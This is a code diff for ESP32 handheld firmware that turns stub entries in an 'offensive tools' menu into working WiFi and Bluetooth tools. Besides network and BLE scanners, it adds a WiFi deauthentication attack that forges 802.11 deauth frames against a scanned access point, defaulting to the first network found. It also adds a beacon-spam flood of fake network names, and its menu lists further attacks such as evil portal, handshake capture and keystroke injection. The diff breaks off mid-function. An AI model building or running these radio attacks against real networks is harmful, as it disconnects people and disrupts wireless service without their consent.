@@ -1,87 +1,539 @@
 // SquachWatch-CYD — Bruce Toolbox UI
-// Draws the offensive-tools menu inside SquatchWatch's visual shell.
-// Each tool is a stub right now; the implementations will come from
-// Bruce's modules, adapted to draw through SquatchWatch's TFT_eSPI.
+// Offensive tools running inside SquatchWatch's visual shell.
 #include "ui_toolbox.h"
 #include "theme.h"
 #include "settings.h"
 #include <Arduino.h>
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <NimBLEDevice.h>
+
+// ---- Which tool is actively running ----
+enum class ActiveTool : uint8_t { NONE = 0, WIFI_SCAN, DEAUTH, BEACON_SPAM, BLE_SCAN, BLE_SPAM_APPLE };
 
 // ---- State ----
-
 static ToolboxLevel  s_level  = ToolboxLevel::CATEGORIES;
 static int           s_scroll = 0;
-static int           s_selected = -1;   // highlighted row, -1 = none
+static int           s_selected = -1;
 static bool          s_toolActive = false;
+static ActiveTool    s_activeTool = ActiveTool::NONE;
+static uint32_t      s_toolStartMs = 0;
+static int           s_toolScroll = 0;  // scroll within tool output
 
-// ---- Layout constants ----
-
+// ---- Layout ----
 static const int ROW_H     = 42;
 static const int ROW_PAD   = 6;
 static const int HEADER_H  = 36;
-static const int TEXT_Y_OFF = 12;  // text baseline offset within a row
+static const int RESULT_H  = 28;
+static const int RESULT_PAD = 2;
 
-// ---- Menu labels ----
-
-static const char* CAT_LABELS[] = {
-    "\xF0\x9F\x93\xA1 WIFI ATTACKS",    // will render as text, emoji stripped on TFT
-    "\xF0\x9F\x93\xB1 BLE TOOLS",
-    "\xF0\x9F\x94\x8C USB / BADUSB",
-    "\xF0\x9F\x94\xA7 UTILITIES",
-    "\xE2\x86\x90 BACK"
+// =============================================================================
+//  WIFI SCAN
+// =============================================================================
+static const int MAX_SCAN_RESULTS = 40;
+struct ScanResult {
+    char ssid[33];
+    int32_t rssi;
+    uint8_t channel;
+    uint8_t encType;  // WIFI_AUTH_OPEN etc
+    uint8_t bssid[6];
 };
-// Plain ASCII fallback labels (what actually renders on TFT_eSPI)
+static ScanResult s_scanResults[MAX_SCAN_RESULTS];
+static int s_scanCount = 0;
+static bool s_scanning = false;
+static int s_scanSelected = -1;  // for deauth target selection
+
+static void wifiScanStart() {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    delay(50);
+    s_scanning = true;
+    s_scanCount = 0;
+    WiFi.scanNetworks(true, true);  // async, show hidden
+    Serial.println("[toolbox] WiFi scan started");
+}
+
+static void wifiScanUpdate() {
+    int16_t result = WiFi.scanComplete();
+    if (result == WIFI_SCAN_RUNNING) return;
+    if (result == WIFI_SCAN_FAILED) {
+        s_scanning = false;
+        Serial.println("[toolbox] WiFi scan failed");
+        return;
+    }
+    s_scanCount = min((int)result, MAX_SCAN_RESULTS);
+    for (int i = 0; i < s_scanCount; i++) {
+        strncpy(s_scanResults[i].ssid, WiFi.SSID(i).c_str(), 32);
+        s_scanResults[i].ssid[32] = 0;
+        if (s_scanResults[i].ssid[0] == 0) strcpy(s_scanResults[i].ssid, "<hidden>");
+        s_scanResults[i].rssi = WiFi.RSSI(i);
+        s_scanResults[i].channel = WiFi.channel(i);
+        s_scanResults[i].encType = WiFi.encryptionType(i);
+        memcpy(s_scanResults[i].bssid, WiFi.BSSID(i), 6);
+    }
+    WiFi.scanDelete();
+    s_scanning = false;
+    Serial.printf("[toolbox] WiFi scan done: %d networks\n", s_scanCount);
+}
+
+static const char* encStr(uint8_t t) {
+    switch (t) {
+        case WIFI_AUTH_OPEN:            return "OPEN";
+        case WIFI_AUTH_WEP:             return "WEP";
+        case WIFI_AUTH_WPA_PSK:         return "WPA";
+        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
+        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA+2";
+        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
+        case WIFI_AUTH_WPA2_WPA3_PSK:   return "W2+3";
+        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
+        default:                        return "?";
+    }
+}
+
+static void drawRssiBar(TFT_eSPI& t, int x, int y, int w, int h, int32_t rssi) {
+    // -30 = max, -90 = min
+    float pct = constrain((rssi + 90.0f) / 60.0f, 0.0f, 1.0f);
+    int barW = (int)(w * pct);
+    uint16_t col = pct > 0.6f ? Theme::GREEN : pct > 0.3f ? Theme::AMBER : Theme::RED;
+    t.fillRect(x, y, w, h, Theme::TASKBAR);
+    t.fillRect(x, y, barW, h, col);
+}
+
+static void drawWifiScan(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    if (s_scanning) wifiScanUpdate();
+
+    // Status line
+    int statusY = HEADER_H + 2;
+    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
+    t.setTextDatum(TL_DATUM);
+    char buf[48];
+    if (s_scanning) {
+        snprintf(buf, sizeof buf, "Scanning...");
+    } else {
+        snprintf(buf, sizeof buf, "Found %d networks  [TAP=rescan]", s_scanCount);
+    }
+    t.drawString(buf, 8, statusY, 2);
+
+    // Results list
+    int listTop = statusY + 20;
+    int visibleRows = (h - listTop - 30) / (RESULT_H + RESULT_PAD);
+
+    for (int i = 0; i < s_scanCount; i++) {
+        int drawIdx = i - s_toolScroll;
+        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
+        int y = listTop + drawIdx * (RESULT_H + RESULT_PAD);
+        const ScanResult& r = s_scanResults[i];
+        bool selected = (i == s_scanSelected);
+
+        // Row background
+        uint16_t rowBg = selected ? Theme::PURPLE : Theme::TASKBAR;
+        t.fillRect(4, y, w - 8, RESULT_H, rowBg);
+
+        // SSID (truncated to fit)
+        t.setTextColor(Theme::CYAN, rowBg);
+        t.setTextDatum(ML_DATUM);
+        char ssidBuf[22];
+        strncpy(ssidBuf, r.ssid, 21);
+        ssidBuf[21] = 0;
+        t.drawString(ssidBuf, 8, y + RESULT_H / 2, 2);
+
+        // RSSI bar
+        drawRssiBar(t, w - 130, y + 4, 40, RESULT_H - 8, r.rssi);
+
+        // RSSI number
+        t.setTextColor(Theme::VAPOR_PINK, rowBg);
+        t.setTextDatum(MR_DATUM);
+        snprintf(buf, sizeof buf, "%ddBm", (int)r.rssi);
+        t.drawString(buf, w - 135, y + RESULT_H / 2, 1);
+
+        // Channel
+        t.setTextColor(Theme::AMBER, rowBg);
+        t.setTextDatum(MR_DATUM);
+        snprintf(buf, sizeof buf, "CH%d", r.channel);
+        t.drawString(buf, w - 75, y + RESULT_H / 2, 1);
+
+        // Encryption
+        uint16_t encCol = (r.encType == WIFI_AUTH_OPEN) ? Theme::RED : Theme::GREEN;
+        t.setTextColor(encCol, rowBg);
+        t.setTextDatum(MR_DATUM);
+        t.drawString(encStr(r.encType), w - 10, y + RESULT_H / 2, 1);
+    }
+
+    // Bottom bar
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  DEAUTH
+// =============================================================================
+static uint8_t s_deauthBssid[6] = {0};
+static uint8_t s_deauthChan = 0;
+static uint32_t s_deauthCount = 0;
+static uint32_t s_deauthLastMs = 0;
+static char s_deauthTarget[33] = {0};
+
+// Deauth frame template: 802.11 management frame, subtype 0xC0
+static uint8_t deauthFrame[26] = {
+    0xC0, 0x00,                         // type/subtype: deauth
+    0x00, 0x00,                         // duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: AP BSSID (filled in)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled in)
+    0x00, 0x00,                         // seq
+    0x07, 0x00                          // reason: class 3 frame from nonassociated STA
+};
+
+static void deauthStart(int scanIdx) {
+    if (scanIdx < 0 || scanIdx >= s_scanCount) return;
+    memcpy(s_deauthBssid, s_scanResults[scanIdx].bssid, 6);
+    s_deauthChan = s_scanResults[scanIdx].channel;
+    strncpy(s_deauthTarget, s_scanResults[scanIdx].ssid, 32);
+    s_deauthCount = 0;
+    s_deauthLastMs = 0;
+
+    // Set source and BSSID in frame
+    memcpy(deauthFrame + 10, s_deauthBssid, 6);
+    memcpy(deauthFrame + 16, s_deauthBssid, 6);
+
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    esp_wifi_set_channel(s_deauthChan, WIFI_SECOND_CHAN_NONE);
+    Serial.printf("[toolbox] Deauth started on %s (ch%d)\n", s_deauthTarget, s_deauthChan);
+}
+
+static void deauthTick() {
+    uint32_t now = millis();
+    if (now - s_deauthLastMs < 50) return;  // ~20 packets/sec
+    s_deauthLastMs = now;
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+    s_deauthCount++;
+}
+
+static void drawDeauth(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    deauthTick();
+
+    // Target info
+    t.setTextColor(Theme::RED, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("DEAUTH ACTIVE", w / 2, HEADER_H + 20, 4);
+
+    t.setTextColor(Theme::CYAN, Theme::BG);
+    t.drawString(s_deauthTarget, w / 2, HEADER_H + 55, 2);
+
+    char buf[48];
+    snprintf(buf, sizeof buf, "CH %d  |  %02X:%02X:%02X:%02X:%02X:%02X",
+             s_deauthChan, s_deauthBssid[0], s_deauthBssid[1], s_deauthBssid[2],
+             s_deauthBssid[3], s_deauthBssid[4], s_deauthBssid[5]);
+    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
+    t.drawString(buf, w / 2, HEADER_H + 80, 2);
+
+    // Packet counter — big
+    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_deauthCount);
+    t.drawString(buf, w / 2, h / 2 + 10, 7);
+
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("packets sent", w / 2, h / 2 + 50, 2);
+
+    // Elapsed
+    uint32_t elapsed = (now - s_toolStartMs) / 1000;
+    snprintf(buf, sizeof buf, "%02lu:%02lu", elapsed / 60, elapsed % 60);
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.drawString(buf, w / 2, h / 2 + 75, 2);
+
+    // Bottom
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  BEACON SPAM
+// =============================================================================
+static const int BEACON_COUNT = 20;
+static uint32_t s_beaconsSent = 0;
+static uint32_t s_beaconLastMs = 0;
+
+static const char* BEACON_SSIDS[] = {
+    "Free WiFi", "FBI Surveillance Van", "NSA_Field_Office",
+    "Pretty Fly for a WiFi", "Drop It Like Its Hotspot",
+    "Tell My WiFi Love Her", "Wu Tang LAN", "The Promised LAN",
+    "Bill Wi the Science Fi", "It Burns When IP",
+    "Nacho WiFi", "Get Off My LAN", "Abraham Linksys",
+    "Benjamin FrankLAN", "John Wilkes Bluetooth",
+    "Silence of the LANs", "LAN Solo", "The LAN Before Time",
+    "Winternet Is Coming", "I Believe Wi Can Fi"
+};
+
+// Minimal beacon frame
+static uint8_t beaconFrame[128] = {
+    0x80, 0x00,                         // type: beacon
+    0x00, 0x00,                         // duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
+    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, // src (randomized per SSID)
+    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, // BSSID (same)
+    0x00, 0x00,                         // seq
+    // Fixed parameters (8 bytes)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
+    0x64, 0x00,                         // interval: 100 TU
+    0x31, 0x04,                         // capabilities: ESS + privacy
+    // Tagged parameters start at offset 36
+};
+
+static void beaconSpamStart() {
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    s_beaconsSent = 0;
+    s_beaconLastMs = 0;
+    Serial.println("[toolbox] Beacon spam started");
+}
+
+static void beaconSpamTick() {
+    uint32_t now = millis();
+    if (now - s_beaconLastMs < 10) return;  // ~100 beacons/sec
+    s_beaconLastMs = now;
+
+    int idx = s_beaconsSent % BEACON_COUNT;
+    const char* ssid = BEACON_SSIDS[idx];
+    size_t ssidLen = strlen(ssid);
+
+    // Randomize last 2 bytes of MAC per SSID
+    beaconFrame[10] = 0xDE; beaconFrame[11] = 0xAD;
+    beaconFrame[12] = 0xBE; beaconFrame[13] = 0xEF;
+    beaconFrame[14] = (uint8_t)idx; beaconFrame[15] = (uint8_t)(idx ^ 0xAA);
+    memcpy(beaconFrame + 16, beaconFrame + 10, 6);
+
+    // SSID tag at offset 36
+    beaconFrame[36] = 0x00;  // tag: SSID
+    beaconFrame[37] = (uint8_t)ssidLen;
+    memcpy(beaconFrame + 38, ssid, ssidLen);
+
+    // Supported rates tag right after SSID
+    size_t ratesOff = 38 + ssidLen;
+    beaconFrame[ratesOff] = 0x01;     // tag: supported rates
+    beaconFrame[ratesOff + 1] = 0x08; // 8 rates
+    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
+    memcpy(beaconFrame + ratesOff + 2, rates, 8);
+
+    // Channel tag
+    size_t chanOff = ratesOff + 10;
+    beaconFrame[chanOff] = 0x03;     // tag: DS parameter
+    beaconFrame[chanOff + 1] = 0x01;
+    beaconFrame[chanOff + 2] = 0x01; // channel 1
+
+    size_t frameLen = chanOff + 3;
+    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, frameLen, false);
+    s_beaconsSent++;
+}
+
+static void drawBeaconSpam(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    beaconSpamTick();
+
+    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("BEACON SPAM", w / 2, HEADER_H + 20, 4);
+
+    // Show some of the SSIDs being broadcast
+    t.setTextDatum(TL_DATUM);
+    int listY = HEADER_H + 50;
+    for (int i = 0; i < min(BEACON_COUNT, 8); i++) {
+        t.setTextColor(Theme::CYAN, Theme::BG);
+        t.drawString(BEACON_SSIDS[i], 12, listY + i * 18, 2);
+    }
+
+    // Counter
+    char buf[32];
+    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_beaconsSent);
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString(buf, w / 2, h - 60, 6);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString("beacons sent", w / 2, h - 32, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  BLE SCAN
+// =============================================================================
+static const int MAX_BLE_RESULTS = 40;
+struct BleResult {
+    char name[25];
+    char addr[18];
+    int rssi;
+    uint16_t appearance;
+};
+static BleResult s_bleResults[MAX_BLE_RESULTS];
+static int s_bleCount = 0;
+static bool s_bleScanning = false;
+static NimBLEScan* s_pBLEScan = nullptr;
+
+class ToolboxBleCallbacks : public NimBLEScanCallbacks {
+    void onResult(const NimBLEAdvertisedDevice* dev) override {
+        if (s_bleCount >= MAX_BLE_RESULTS) return;
+        BleResult& r = s_bleResults[s_bleCount];
+        const char* n = dev->getName().c_str();
+        if (n && n[0]) strncpy(r.name, n, 24);
+        else strcpy(r.name, "<unknown>");
+        r.name[24] = 0;
+        snprintf(r.addr, sizeof r.addr, "%s", dev->getAddress().toString().c_str());
+        r.rssi = dev->getRSSI();
+        r.appearance = dev->getAppearance();
+        s_bleCount++;
+    }
+};
+static ToolboxBleCallbacks s_bleCallbacks;
+
+static void bleScanStart() {
+    s_bleCount = 0;
+    s_bleScanning = true;
+    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
+    s_pBLEScan = NimBLEDevice::getScan();
+    s_pBLEScan->setScanCallbacks(&s_bleCallbacks, false);
+    s_pBLEScan->setActiveScan(true);
+    s_pBLEScan->setInterval(100);
+    s_pBLEScan->setWindow(99);
+    s_pBLEScan->start(10, false);  // 10 seconds
+    Serial.println("[toolbox] BLE scan started");
+}
+
+static void bleScanUpdate() {
+    if (s_pBLEScan && !s_pBLEScan->isScanning()) {
+        s_bleScanning = false;
+    }
+}
+
+static void drawBleScan(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    if (s_bleScanning) bleScanUpdate();
+
+    int statusY = HEADER_H + 2;
+    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
+    t.setTextDatum(TL_DATUM);
+    char buf[48];
+    if (s_bleScanning) snprintf(buf, sizeof buf, "BLE scanning... (%d found)", s_bleCount);
+    else snprintf(buf, sizeof buf, "Found %d devices  [TAP=rescan]", s_bleCount);
+    t.drawString(buf, 8, statusY, 2);
+
+    int listTop = statusY + 20;
+    int visibleRows = (h - listTop - 30) / (RESULT_H + RESULT_PAD);
+
+    for (int i = 0; i < s_bleCount; i++) {
+        int drawIdx = i - s_toolScroll;
+        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
+        int y = listTop + drawIdx * (RESULT_H + RESULT_PAD);
+        const BleResult& r = s_bleResults[i];
+
+        t.fillRect(4, y, w - 8, RESULT_H, Theme::TASKBAR);
+
+        // Name
+        t.setTextColor(Theme::CYAN, Theme::TASKBAR);
+        t.setTextDatum(ML_DATUM);
+        t.drawString(r.name, 8, y + RESULT_H / 2, 2);
+
+        // RSSI bar
+        drawRssiBar(t, w - 120, y + 4, 35, RESULT_H - 8, r.rssi);
+
+        // RSSI number
+        t.setTextColor(Theme::VAPOR_PINK, Theme::TASKBAR);
+        t.setTextDatum(MR_DATUM);
+        snprintf(buf, sizeof buf, "%d", r.rssi);
+        t.drawString(buf, w - 125, y + RESULT_H / 2, 1);
+
+        // Address
+        t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+        t.setTextDatum(MR_DATUM);
+        t.drawString(r.addr, w - 10, y + RESULT_H / 2, 1);
+    }
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  Tool stop / cleanup
+// =============================================================================
+static void stopActiveTool() {
+    switch (s_activeTool) {
+        case ActiveTool::WIFI_SCAN:
+            WiFi.scanDelete();
+            WiFi.mode(WIFI_OFF);
+            break;
+        case ActiveTool::DEAUTH:
+            WiFi.mode(WIFI_OFF);
+            break;
+        case ActiveTool::BEACON_SPAM:
+            WiFi.mode(WIFI_OFF);
+            break;
+        case ActiveTool::BLE_SCAN:
+            if (s_pBLEScan && s_pBLEScan->isScanning()) s_pBLEScan->stop();
+            break;
+        default: break;
+    }
+    s_activeTool = ActiveTool::NONE;
+    s_toolActive = false;
+    Serial.println("[toolbox] tool stopped");
+}
+
+// =============================================================================
+//  Tool launch
+// =============================================================================
+static void launchTool(ActiveTool tool) {
+    s_activeTool = tool;
+    s_toolActive = true;
+    s_toolStartMs = millis();
+    s_toolScroll = 0;
+    s_level = ToolboxLevel::TOOL_RUNNING;
+    switch (tool) {
+        case ActiveTool::WIFI_SCAN:   wifiScanStart();   break;
+        case ActiveTool::DEAUTH:      /* needs target, handled separately */ break;
+        case ActiveTool::BEACON_SPAM: beaconSpamStart();  break;
+        case ActiveTool::BLE_SCAN:    bleScanStart();     break;
+        default: break;
+    }
+}
+
+// =============================================================================
+//  Menu labels (unchanged)
+// =============================================================================
 static const char* CAT_LABELS_PLAIN[] = {
-    "WIFI ATTACKS",
-    "BLE TOOLS",
-    "USB / BADUSB",
-    "UTILITIES",
-    "< BACK"
+    "WIFI ATTACKS", "BLE TOOLS", "USB / BADUSB", "UTILITIES", "< BACK"
 };
-
 static const char* WIFI_LABELS[] = {
-    "SCAN NETWORKS",
-    "DEAUTH",
-    "BEACON SPAM",
-    "EVIL PORTAL",
-    "PROBE SNIFF",
-    "PMKID CAPTURE",
-    "HANDSHAKE CAPTURE",
-    "PCAP TO SD",
-    "DHCP STARVE",
-    "AP CLONE",
-    "KARMA",
-    "RICKROLL",
-    "< BACK"
+    "SCAN NETWORKS", "DEAUTH", "BEACON SPAM", "EVIL PORTAL",
+    "PROBE SNIFF", "PMKID CAPTURE", "HANDSHAKE CAPTURE", "PCAP TO SD",
+    "DHCP STARVE", "AP CLONE", "KARMA", "RICKROLL", "< BACK"
 };
-
 static const char* BLE_LABELS[] = {
-    "SCAN DEVICES",
-    "APPLE SPAM",
-    "SAMSUNG SPAM",
-    "SWIFTPAIR SPAM",
-    "AIRTAG SPOOF",
-    "FLIPPER DETECT",
-    "BLE ENUMERATE",
-    "< BACK"
+    "SCAN DEVICES", "APPLE SPAM", "SAMSUNG SPAM", "SWIFTPAIR SPAM",
+    "AIRTAG SPOOF", "FLIPPER DETECT", "BLE ENUMERATE", "< BACK"
 };
-
 static const char* USB_LABELS[] = {
-    "DUCKY SCRIPT (SD)",
-    "KEYSTROKE INJECT",
-    "USB KEYBOARD",
-    "USB STORAGE",
-    "< BACK"
+    "DUCKY SCRIPT (SD)", "KEYSTROKE INJECT", "USB KEYBOARD", "USB STORAGE", "< BACK"
 };
-
 static const char* UTIL_LABELS[] = {
-    "SD BROWSER",
-    "WIFI LOGGER",
-    "PCAP VIEWER",
-    "< BACK"
+    "SD BROWSER", "WIFI LOGGER", "PCAP VIEWER", "< BACK"
 };
-
-// ---- Helpers ----
 
 static const char** labelsForLevel(ToolboxLevel lvl, int& count) {
     switch (lvl) {
@@ -101,13 +553,21 @@ static const char* headerForLevel(ToolboxLevel lvl) {
         case ToolboxLevel::BLE_TOOLS:  return "BLE TOOLS";
         case ToolboxLevel::USB_TOOLS:  return "USB / BADUSB";
         case ToolboxLevel::UTIL_TOOLS: return "UTILITIES";
-        case ToolboxLevel::TOOL_RUNNING: return "RUNNING...";
+        case ToolboxLevel::TOOL_RUNNING:
+            switch (s_activeTool) {
+                case ActiveTool::WIFI_SCAN:   return "WIFI SCAN";
+                case ActiveTool::DEAUTH:      return "DEAUTH";
+                case ActiveTool::BEACON_SPAM: return "BEACON SPAM";
+                case ActiveTool::BLE_SCAN:    return "BLE SCAN";
+                default:                      return "RUNNING...";
+            }
         default: return "TOOLBOX";
     }
 }
 
-// ---- Draw ----
-
+// =============================================================================
+//  Draw helpers
+// =============================================================================
 static void drawRow(TFT_eSPI& t, int x, int y, int w, const char* label, bool highlight) {
     const uint16_t bg = highlight ? Theme::PURPLE : Theme::TASKBAR;
     const uint16_t fg = highlight ? Theme::BG     : Theme::CYAN;
@@ -118,21 +578,53 @@ static void drawRow(TFT_eSPI& t, int x, int y, int w, const char* label, bool hi
     t.drawString(label, x + 14, y + ROW_H / 2 - 2, 2);
 }
 
+static void drawMenuRows(TFT_eSPI& t) {
+    const int w = t.width();
+    const int h = t.height();
+    int count = 0;
+    const char** labels = labelsForLevel(s_level, count);
+    if (!labels) return;
+
+    const int menuTop = HEADER_H + ROW_PAD;
+    int visibleRows = (h - menuTop) / (ROW_H + ROW_PAD);
+
+    for (int i = 0; i < count; i++) {
+        int drawIdx = i - s_scroll;
+        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
+        int y = menuTop + drawIdx * (ROW_H + ROW_PAD);
+        bool isBack = (i == count - 1);
+        bool hl = (i == s_selected);
+
+        if (isBack) {
+            t.fillRoundRect(ROW_PAD, y, w - ROW_PAD * 2, ROW_H - 4, 6, Theme::BG);
+            t.setTextColor(Theme::AMBER, Theme::BG);
+            t.setTextDatum(ML_DATUM);
+            t.drawString(labels[i], ROW_PAD + 14, y + ROW_H / 2 - 2, 2);
+        } else {
+            drawRow(t, ROW_PAD, y, w - ROW_PAD * 2, labels[i], hl);
+        }
+    }
+}
+
+// =============================================================================
+//  Public API
+// =============================================================================
 void uiToolboxInit(TFT_eSPI& t) {
     s_level = ToolboxLevel::CATEGORIES;
     s_scroll = 0;
     s_selected = -1;
     s_toolActive = false;
+    s_activeTool = ActiveTool::NONE;
+    s_toolScroll = 0;
 }
 
 void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
     const int w = t.width();
     const int h = t.height();
 
-    // Background — solid theme color (no DetectionEngine dependency here)
     t.fillRect(0, 0, w, h, Theme::BG);
 
-    // Header bar
+    // Header
     t.fillRect(0, 0, w, HEADER_H, Theme::TASKBAR);
     t.setTextColor(Theme::VAPOR_PINK, Theme::TASKBAR);
     t.setTextSize(1);
@@ -140,40 +632,30 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
     t.drawString(headerForLevel(s_level), w / 2, HEADER_H / 2, 4);
 
     if (s_level == ToolboxLevel::TOOL_RUNNING) {
-        // Tool is running — show a simple status
-        t.setTextColor(Theme::CYAN, Theme::BG);
-        t.setTextDatum(MC_DATUM);
-        t.drawString("Tool active...", w / 2, h / 2, 4);
-        t.drawString("TAP TO STOP", w / 2, h / 2 + 30, 2);
+        switch (s_activeTool) {
+            case ActiveTool::WIFI_SCAN:   drawWifiScan(t, now);   break;
+            case ActiveTool::DEAUTH:      drawDeauth(t, now);     break;
+            case ActiveTool::BEACON_SPAM: drawBeaconSpam(t, now); break;
+            case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
+            default:
+                t.setTextColor(Theme::CYAN, Theme::BG);
+                t.setTextDatum(MC_DATUM);
+                t.drawString("Not yet implemented", w / 2, h / 2, 4);
+                t.drawString("TAP TO STOP", w / 2, h / 2 + 30, 2);
+                break;
+        }
         return;
     }
 
-    // Menu rows
-    int count = 0;
-    const char** labels = labelsForLevel(s_level, count);
-    if (!labels) return;
-
-    const int menuTop = HEADER_H + ROW_PAD;
-    const int visibleRows = (h - menuTop) / (ROW_H + ROW_PAD);
-
-    for (int i = 0; i < count; i++) {
-        const int y = menuTop + (i - s_scroll) * (ROW_H + ROW_PAD);
-        if (y < HEADER_H - ROW_H || y > h) continue;  // off screen
-        const bool isBack = (i == count - 1);
-        const bool hl = (i == s_selected);
-        drawRow(t, ROW_PAD, y, w - ROW_PAD * 2, labels[i], hl);
-
-        // Back row gets a different accent
-        if (isBack) {
-            t.fillRoundRect(ROW_PAD, y, w - ROW_PAD * 2, ROW_H - 4, 6, Theme::BG);
-            t.setTextColor(Theme::AMBER, Theme::BG);
-            t.setTextDatum(ML_DATUM);
-            t.drawString(labels[i], ROW_PAD + 14, y + ROW_H / 2 - 2, 2);
-        }
-    }
+    drawMenuRows(t);
 }
 
 void uiToolboxScroll(int delta) {
+    if (s_level == ToolboxLevel::TOOL_RUNNING) {
+        s_toolScroll += delta;
+        if (s_toolScroll < 0) s_toolScroll = 0;
+        return;
+    }
     int count = 0;
     labelsForLevel(s_level, count);
     s_scroll += delta;
@@ -182,73 +664,115 @@ void uiToolboxScroll(int delta) {
     if (s_scroll < 0) s_scroll = 0;
 }
 
-// ---- Tool stubs ----
-// These will be replaced with actual Bruce tool implementations.
-
-static void stubToolRun(const char* name) {
-    Serial.printf("[toolbox] STUB: %s — not yet implemented\n", name);
-    s_toolActive = true;
-    s_level = ToolboxLevel::TOOL_RUNNING;
-}
-
 static void handleCategoryTap(int idx) {
     switch ((ToolCategory)idx) {
         case ToolCategory::WIFI: s_level = ToolboxLevel::WIFI_TOOLS; s_scroll = 0; break;
         case ToolCategory::BLE:  s_level = ToolboxLevel::BLE_TOOLS;  s_scroll = 0; break;
         case ToolCategory::USB:  s_level = ToolboxLevel::USB_TOOLS;  s_scroll = 0; break;
         case ToolCategory::UTIL: s_level = ToolboxLevel::UTIL_TOOLS; s_scroll = 0; break;
-        case ToolCategory::BACK: break;  // caller handles return to CLEAR
+        case ToolCategory::BACK: break;
         default: break;
     }
 }
 
 static bool handleWifiTap(int idx) {
     if ((WifiTool)idx == WifiTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
-    stubToolRun(WIFI_LABELS[idx]);
+    switch ((WifiTool)idx) {
+        case WifiTool::SCAN_NETWORKS: launchTool(ActiveTool::WIFI_SCAN); break;
+        case WifiTool::DEAUTH:
+            // Need a target — run a scan first, then pick
+            if (s_scanCount == 0) {
+                launchTool(ActiveTool::WIFI_SCAN);  // scan first, user can deauth from scan
+            } else {
+                // Use first found network as default target (TODO: selection UI)
+                s_scanSelected = 0;
+                deauthStart(0);
+                launchTool(ActiveTool::DEAUTH);
+            }
+            break;
+        case WifiTool::BEACON_SPAM:   launchTool(ActiveTool::BEACON_SPAM); break;
+        default:
+            s_toolActive = true;
+            s_activeTool = ActiveTool::NONE;
+            s_level = ToolboxLevel::TOOL_RUNNING;
+            break;
+    }
     return true;
 }
 
 static bool handleBleTap(int idx) {
     if ((BleTool)idx == BleTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
-    stubToolRun(BLE_LABELS[idx]);
+    switch ((BleTool)idx) {
+        case BleTool::SCAN_DEVICES: launchTool(ActiveTool::BLE_SCAN); break;
+        default:
+            s_toolActive = true;
+            s_activeTool = ActiveTool::NONE;
+            s_level = ToolboxLevel::TOOL_RUNNING;
+            break;
+    }
     return true;
 }
 
 static bool handleUsbTap(int idx) {
     if ((UsbTool)idx == UsbTool::BACK) { s_level = ToolboxLevel::CATEGORIES; s_scroll = 0; return true; }
-    stubToolRun(USB_LABELS[idx]);
+    s_toolActive = true;
